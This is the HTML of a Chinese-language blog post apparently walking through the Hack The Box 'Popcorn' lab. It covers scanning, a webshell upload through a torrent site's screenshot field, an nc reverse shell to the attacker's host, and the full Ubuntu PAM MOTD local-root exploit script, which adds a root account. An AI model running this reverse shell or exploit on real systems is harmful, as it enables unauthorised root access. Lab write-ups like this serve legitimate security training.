@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Hack The Box —— Popcorn - Geekby&#39;s Blog</title><meta name="Description" content="Hack The Box靶场练习记录"><meta property="og:title" content="Hack The Box —— Popcorn" />
+<meta property="og:description" content="Hack The Box靶场练习记录" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2019/09/hacktheboxpopcorn/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-09-04T16:00:00+08:00" />
+<meta property="article:modified_time" content="2019-09-04T16:00:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hack The Box —— Popcorn"/>
+<meta name="twitter:description" content="Hack The Box靶场练习记录"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2019/09/hacktheboxpopcorn/" /><link rel="prev" href="https://www.geekby.site/2019/08/hacktheboxdevel/" /><link rel="next" href="https://www.geekby.site/2019/09/hacktheboxtenten/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hack The Box —— Popcorn",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2019\/09\/hacktheboxpopcorn\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "HTB靶场","wordcount":  538 ,
+        "url": "https:\/\/www.geekby.site\/2019\/09\/hacktheboxpopcorn\/","datePublished": "2019-09-04T16:00:00+08:00","dateModified": "2019-09-04T16:00:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "Hack The Box靶场练习记录"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Hack The Box —— Popcorn</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/"><i class="far fa-folder fa-fw"></i>靶场</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-09-04">2019-09-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 538 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#信息搜集">信息搜集</a>
+      <ul>
+        <li><a href="#nmap">nmap</a></li>
+        <li><a href="#目录扫描">目录扫描</a></li>
+        <li><a href="#功能点搜索">功能点搜索</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞利用">漏洞利用</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="hack-the-box--popcorn">Hack The Box —— Popcorn</h1>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904190902.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904190902.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904190902.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904190902.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904190902.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904190902.png-water_print" /></p>
+<h2 id="信息搜集">信息搜集</h2>
+<h3 id="nmap">nmap</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nmap -T4 -A -v 10.10.10.6
+</code></pre></td></tr></table>
+</div>
+</div><p>发现服务器开了 <code>22</code> 端口和 <code>80</code> 端口浏览器访问 <code>http</code> 服务，发现 只有 <code>apache</code> 的默认页面。</p>
+<h3 id="目录扫描">目录扫描</h3>
+<p>利用 <code>dirsearch</code> 工具扫描一波目录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">python3 dirsearch -u http://10.10.10.6 -e html
+</code></pre></td></tr></table>
+</div>
+</div><p>发现 <code>test.php</code> 页面和 <code>torrent</code> 目录，针对 <code>torrent</code> 目录进行目录扫描，发现 <code>upload</code> 上传目录可以访问，同时存在 index.php 页面。</p>
+<h3 id="功能点搜索">功能点搜索</h3>
+<p>该网站为 bt 种子论坛站，注册用户，发现上传页面。
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191408.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191408.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191408.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191408.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191408.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191408.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191435.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191435.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191435.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191435.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191435.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191435.png-water_print" /></p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>在上传点尝试上传 webshell，发现失败，猜测程序检测上传的文件是否为标准的 <code>bt</code> 种子文件，且并未绕过过滤。
+继续上传正常的 <code>bt</code> 种子文件，进行进一步测试:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191857.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191857.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191857.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191857.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191857.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904191857.png-water_print" /></p>
+<p>发现在上传好的种子页面存在 screenshots 图标上传点，</p>
+<p>尝试上传 <code>webshell</code>，发现成功上传。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192051.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192051.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192051.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192051.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192051.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192051.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192134.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192134.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192134.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192134.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192134.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192134.png-water_print" /></p>
+<p>访问 <code>upload</code> 目录，得到 <code>webshell</code> 的地址：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192256.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192256.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192256.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192256.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192256.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192256.png-water_print" /></p>
+<p>菜刀连接：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192316.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192316.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192316.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192316.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192316.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192316.png-water_print" /></p>
+<p>成功获取 user 的 flag。
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192325.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192325.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192325.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192325.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192325.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192325.png-water_print" /></p>
+<p>同时在 <code>home</code> 目录下发现 <code>.cache</code> 文件夹，进入后发现 <code>motd.legal-displayed</code> 文件。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192449.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192449.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192449.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192449.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192449.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904192449.png-water_print" /></p>
+<p>利用搜索引擎搜索相关文档，发现：
+<a href="https://www.exploit-db.com/exploits/14339" target="_blank" rel="noopener noreffer">https://www.exploit-db.com/exploits/14339</a></p>
+<p>利用虚拟终端反弹一个 <code>shell</code> 到本地，便于提权操作。</p>
+<p>本机： <code>nc -l 4444</code>
+受害机：<code>nc -e /bin/bash 10.10.14.10 4444</code></p>
+<p>利用菜刀上传 <code>exp</code> 脚本:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span><span class="c1">#</span>
+<span class="c1"># Exploit Title: Ubuntu PAM MOTD local root</span>
+<span class="c1"># Date: July 9, 2010</span>
+<span class="c1"># Author: Anonymous</span>
+<span class="c1"># Software Link: http://packages.ubuntu.com/</span>
+<span class="c1"># Version: pam-1.1.0</span>
+<span class="c1"># Tested on: Ubuntu 9.10 (Karmic Koala), Ubuntu 10.04 LTS (Lucid Lynx)</span>
+<span class="c1"># CVE: CVE-2010-0832</span>
+<span class="c1"># Patch Instructions: sudo aptitude -y update; sudo aptitude -y install libpam~n~i</span>
+<span class="c1"># References: http://www.exploit-db.com/exploits/14273/ by Kristian Erik Hermansen</span>
+<span class="nv">P</span><span class="o">=</span><span class="s1">&#39;toor❌0:0:root:/root:/bin/bash&#39;</span>
+<span class="nv">S</span><span class="o">=</span><span class="s1">&#39;toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::&#39;</span>
+<span class="nb">echo</span> <span class="s2">&#34;[*] Ubuntu PAM MOTD local root&#34;</span>
+<span class="o">[</span> -z <span class="s2">&#34;</span><span class="k">$(</span>which ssh<span class="k">)</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;[-] ssh is a requirement&#34;</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">1</span>
+<span class="o">[</span> -z <span class="s2">&#34;</span><span class="k">$(</span>which ssh-keygen<span class="k">)</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;[-] ssh-keygen is a requirement&#34;</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">1</span>
+<span class="o">[</span> -z <span class="s2">&#34;</span><span class="k">$(</span>ps -u root <span class="p">|</span>grep sshd<span class="k">)</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;[-] a running sshd is a requirement&#34;</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">1</span>
+backup<span class="o">()</span> <span class="o">{</span>
+    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>.bak <span class="o">]</span> <span class="o">&amp;&amp;</span> rm -rf <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>.bak
+    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="k">return</span> <span class="m">0</span>
+    mv <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span><span class="o">{</span>,.bak<span class="o">}</span> <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
+    <span class="nb">echo</span> <span class="s2">&#34;[*] Backuped </span><span class="nv">$1</span><span class="s2">&#34;</span>
+<span class="o">}</span>
+restore<span class="o">()</span> <span class="o">{</span>
+    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> rm -rf <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
+    <span class="o">[</span> -e <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>.bak <span class="o">]</span> <span class="o">||</span> <span class="k">return</span> <span class="m">0</span>
+    mv <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span><span class="o">{</span>.bak,<span class="o">}</span> <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
+    <span class="nb">echo</span> <span class="s2">&#34;[*] Restored </span><span class="nv">$1</span><span class="s2">&#34;</span>
+<span class="o">}</span>
+key_create<span class="o">()</span> <span class="o">{</span>
+    backup ~/.ssh/authorized_keys
+    ssh-keygen -q -t rsa -N <span class="s1">&#39;&#39;</span> -C <span class="s1">&#39;pam&#39;</span> -f <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">&#34;</span> <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
+    <span class="o">[</span> ! -d ~/.ssh <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">{</span> mkdir ~/.ssh <span class="o">||</span> <span class="k">return</span> 1<span class="p">;</span> <span class="o">}</span>
+    mv <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">.pub&#34;</span> ~/.ssh/authorized_keys <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
+    <span class="nb">echo</span> <span class="s2">&#34;[*] SSH key set up&#34;</span>
+<span class="o">}</span>
+key_remove<span class="o">()</span> <span class="o">{</span>
+    rm -f <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">&#34;</span>
+    restore ~/.ssh/authorized_keys
+    <span class="nb">echo</span> <span class="s2">&#34;[*] SSH key removed&#34;</span>
+<span class="o">}</span>
+own<span class="o">()</span> <span class="o">{</span>
+    <span class="o">[</span> -e ~/.cache <span class="o">]</span> <span class="o">&amp;&amp;</span> rm -rf ~/.cache
+    ln -s <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> ~/.cache <span class="o">||</span> <span class="k">return</span> <span class="m">1</span>
+    <span class="nb">echo</span> <span class="s2">&#34;[*] spawn ssh&#34;</span>
+    ssh -o <span class="s1">&#39;NoHostAuthenticationForLocalhost yes&#39;</span> -i <span class="s2">&#34;</span><span class="nv">$KEY</span><span class="s2">&#34;</span> localhost <span class="nb">true</span>
+    <span class="o">[</span> -w <span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Own </span><span class="nv">$1</span><span class="s2"> failed&#34;</span><span class="p">;</span> restore ~/.cache<span class="p">;</span> bye<span class="p">;</span> <span class="o">}</span>
+    <span class="nb">echo</span> <span class="s2">&#34;[+] owned: </span><span class="nv">$1</span><span class="s2">&#34;</span>
+<span class="o">}</span>
+bye<span class="o">()</span> <span class="o">{</span>
+    key_remove
+    <span class="nb">exit</span> <span class="m">1</span>
+<span class="o">}</span>
+<span class="nv">KEY</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>mktemp -u<span class="k">)</span><span class="s2">&#34;</span>
+key_create <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Failed to setup SSH key&#34;</span><span class="p">;</span> <span class="nb">exit</span> 1<span class="p">;</span> <span class="o">}</span>
+backup ~/.cache <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Failed to backup ~/.cache&#34;</span><span class="p">;</span> bye<span class="p">;</span> <span class="o">}</span>
+own /etc/passwd <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$P</span><span class="s2">&#34;</span> &gt;&gt; /etc/passwd
+own /etc/shadow <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$S</span><span class="s2">&#34;</span> &gt;&gt; /etc/shadow
+restore ~/.cache <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[-] Failed to restore ~/.cache&#34;</span><span class="p">;</span> bye<span class="p">;</span> <span class="o">}</span>
+key_remove
+<span class="nb">echo</span> <span class="s2">&#34;[+] Success! Use password toor to get root&#34;</span>
+su -c <span class="s2">&#34;sed -i &#39;/toor:/d&#39; /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \
+</span><span class="s2">  chgrp shadow /etc/shadow; nscd -i passwd &gt;/dev/null 2&gt;&amp;1; bash&#34;</span> toor
+</code></pre></td></tr></table>
+</div>
+</div><p>并给该脚本赋予执行权限：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">chmod + x 1.sh
+</code></pre></td></tr></table>
+</div>
+</div><p>执行脚本，获得 root 权限：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194200.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194200.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194200.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194200.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194200.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194200.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194204.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194204.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194204.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194204.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194204.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190904194204.png-water_print" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-09-04</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2019/09/hacktheboxpopcorn/" data-title="Hack The Box —— Popcorn"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2019/09/hacktheboxpopcorn/" data-title="Hack The Box —— Popcorn"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2019/09/hacktheboxpopcorn/" data-title="Hack The Box —— Popcorn"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/htb%E9%9D%B6%E5%9C%BA/">HTB靶场</a></section>
+        <section>
